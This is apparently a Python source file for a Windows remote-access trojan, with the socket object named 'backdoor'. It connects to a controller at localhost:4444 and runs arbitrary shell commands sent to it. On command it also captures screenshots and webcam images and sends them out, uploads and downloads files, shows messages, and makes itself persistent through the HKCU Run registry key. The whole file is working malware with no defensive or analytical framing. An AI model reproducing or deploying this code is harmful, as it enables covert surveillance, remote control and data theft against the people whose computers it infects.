import socket
import subprocess
from cv2 import VideoCapture,imwrite,destroyAllWindows,CAP_DSHOW,error
from pyscreeze import screenshot
from io import StringIO, BytesIO


server_ip = "localhost"
port = 4444

backdoor = socket.socket()
backdoor.connect((server_ip, port))

def execute(command,gelen):
    op2 = subprocess.Popen(command , stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE, shell=True,cwd=gelen)
    strOutput2 = op2.stdout.read() + op2.stderr.read()
    return strOutput2
def executeOnSystem(selfCommand):
    subprocess.Popen(selfCommand,shell=True)

while True:
    first = backdoor.recv(1024*1024)
    first = first.decode()
    
    if first == "1":
        gelen = backdoor.recv(1024).decode()
        command = backdoor.recv(1024).decode()
        if command.startswith("del"):
            strOutput2 = execute(command,gelen)
            if len(strOutput2) > 0:
                backdoor.send(strOutput2)
            else:
                backdoor.send(b"deleted")
        else:
            byteOutput = execute(command,gelen)
            backdoor.send(byteOutput)

    elif first == "2":
        screenShotImage = screenshot()

        with BytesIO() as sc:
            screenShotImage.save(sc, format="PNG")
            imageSize = sc.getvalue()
            backdoor.send(imageSize)

    elif first == "3":
        cap = VideoCapture(0,CAP_DSHOW)
        ret,frame = cap.read()

        while True:
            try:
                writed = imwrite('c1.png',frame)
            except error: #cv2.error message:.
                pass
            destroyAllWindows()
            break
        cap.release()
        try:
            with open('c1.png','rb') as camera:
                readedimage = camera.read()
                backdoor.send(readedimage)
            executeOnSystem("del c1.png")
        except FileNotFoundError:
            backdoor.send(b"camera is not found:.")
            
    elif first == "4":
        message = backdoor.recv(1024)
        decodedMessage = message.decode()
        subprocess.Popen("msg %username% {}".format(decodedMessage),shell=True)

    elif first == "5":
        currentDirec = subprocess.Popen("cd",stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE,shell=True)

        byteCurrentDirectoryOutput = currentDirec.stdout.read() + currentDirec.stderr.read() + b"client.py"
        replacedByteCurrentDirectory = byteCurrentDirectoryOutput.replace(b"\n",b"\\")
        replacedStringDirectory = replacedByteCurrentDirectory.replace(b"\r",b"").decode()
        registeryName = "test"
        startup = subprocess.Popen(f"REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /t REG_SZ /v {registeryName} /d {replacedStringDirectory}"
                                            ,stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE,shell=True)
        willSendReg = startup.stdout.read() + startup.stderr.read()

        backdoor.send(willSendReg)
    elif first == "6":
        removeStartup = subprocess.Popen(f"reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v {registeryName} /f"
                                            ,stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE,shell=True)
        willRemoveReg = removeStartup.stdout.read() + removeStartup.stderr.read()

        backdoor.send(willRemoveReg)

    elif first == "7":
        extension = backdoor.recv(1024*1024).decode()#[0][1]
        
        byteFile = backdoor.recv(1024*4096)#[1][1]
        
        with open("byteFile."+extension,"wb") as byte:
            byte.write(byteFile)
            byte.close()

    elif first == "8":
        getFilePath = backdoor.recv(1024).decode()

        with open(getFilePath,"rb") as getFile:
            readedGetFile = getFile.read()
        getFile.close()

        backdoor.send(readedGetFile)
